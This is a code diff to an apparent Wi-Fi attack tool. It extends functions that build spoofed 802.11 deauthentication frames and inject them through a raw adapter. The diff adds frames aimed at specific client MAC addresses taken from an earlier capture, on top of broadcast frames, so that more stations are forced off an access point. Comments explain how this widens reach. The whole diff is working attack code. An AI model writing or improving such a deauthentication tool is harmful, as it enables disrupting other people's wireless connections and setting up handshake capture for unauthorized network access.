@@ -182,30 +182,42 @@ def open_kicker(iface, *, probe: bool = False) -> Kicker:
     return kicker
 
 
-def build_frame(bssid: str, reason: int = REASON_CODE) -> bytes:
-    """A broadcast deauthentication frame claiming to come from ``bssid``.
+def build_frame(bssid: str, reason: int = REASON_CODE, client: str = "ff:ff:ff:ff:ff:ff") -> bytes:
+    """A deauthentication frame claiming to come from ``bssid``, aimed at ``client``.
 
     Twenty-five bytes, built from the raw octets rather than through scapy's
     layers: the frame is nine fixed fields with known offsets, and depending on a
     packet stack to say "25 bytes" buys nothing here. Type/subtype 0/12 is
-    management + deauthentication; the receiver is the broadcast address and the
-    sender is the access point, so a client reads it as the access point
-    forgetting about it -- which is exactly what it means.
+    management + deauthentication; the sender is the access point, so whoever
+    receives it reads it as the access point forgetting about it -- which is
+    exactly what it means.
+
+    ``client`` defaults to the broadcast address, which every client on the
+    network hears -- the only option when nothing is known about who is on
+    it, and the one that still has the widest reach when something is.
     """
-    raw = bytes.fromhex(bssid.replace(":", ""))
+    bssid_raw = bytes.fromhex(bssid.replace(":", ""))
+    client_raw = bytes.fromhex(client.replace(":", ""))
     return b"".join((
         bytes((0xC0, 0x00)),   # frame control: management, deauthentication
         b"\x00\x00",           # duration
-        b"\xff" * 6,           # address 1: broadcast -- every client hears it
-        raw,                   # address 2: the access point's BSSID
-        raw,                   # address 3: the access point's BSSID
+        client_raw,            # address 1: receiver -- broadcast, or one MAC
+        bssid_raw,             # address 2: the access point's BSSID
+        bssid_raw,             # address 3: the access point's BSSID
         b"\x00\x00",           # sequence control
         bytes((reason,)),
     ))
 
 
-def send(kicker: Kicker, bssid: str, count: int = BURST) -> int:
+def send(kicker: Kicker, bssid: str, count: int = BURST, clients: tuple[str, ...] = ()) -> int:
     """Put ``count`` deauthentication frames on the air; returns how many.
+
+    One broadcast frame always goes out -- it is what reaches a client whose
+    MAC is not known, or any client missed by the list below. ``clients``
+    adds a frame addressed to each of those MACs on top of it, never instead:
+    a station that silently drops management frames not addressed to it (some
+    do) still has to act on one that names it, so naming the ones already seen
+    in an earlier capture only adds reach, it never trades broadcast away.
 
     The return value of the inject is checked rather than assumed. On Windows
     the send goes through ``pcap_inject``, which reports how many bytes it
@@ -216,13 +228,19 @@ def send(kicker: Kicker, bssid: str, count: int = BURST) -> int:
     target = normalize_bssid(bssid)
     if not target:
         raise ValueError(f"BSSID не похож на MAC: {bssid!r}")
-    frame = build_frame(target)
+    targets = ["ff:ff:ff:ff:ff:ff"]
+    for client in clients:
+        normalized = normalize_bssid(client)
+        if normalized and normalized != target:
+            targets.append(normalized)
     sent = 0
     for _ in range(max(1, count)):
-        written = kicker.handle.send(frame)  # type: ignore[union-attr]
-        if written is not None and written < len(frame):
-            raise OSError(f"адаптер принял {written} из {len(frame)} байт")
-        sent += 1
+        for client in targets:
+            frame = build_frame(target, client=client)
+            written = kicker.handle.send(frame)  # type: ignore[union-attr]
+            if written is not None and written < len(frame):
+                raise OSError(f"адаптер принял {written} из {len(frame)} байт")
+            sent += 1
     kicker.sent += sent
     return sent
 
@@ -235,8 +253,14 @@ def run(
     interval: float = INTERVAL,
     stop: threading.Event | None = None,
     on_burst: Callable[[int], None] | None = None,
+    clients: tuple[str, ...] = (),
 ) -> tuple[int, str]:
     """Kick ``bssid`` for ``seconds``; returns (frames sent, note).
+
+    ``clients`` are MACs an earlier capture already proved are behind this AP
+    (see :func:`wifi_tool.stations.known_clients`); every burst still opens
+    with a broadcast frame regardless of whether any are given, so passing
+    none is exactly the original, broadcast-only behaviour.
 
     The note is empty when the frames went out and says why when they did not.
     It is returned rather than raised on purpose: the caller is in the middle of
@@ -257,7 +281,7 @@ def run(
     try:
         while time.monotonic() < deadline and not stop.is_set():
             try:
-                send(kicker, bssid)
+                send(kicker, bssid, clients=clients)
             except Exception as exc:  # noqa: BLE001 -- a failed burst is not fatal
                 return kicker.sent, f"отправка не удалась: {exc}"
             if on_burst is not None:
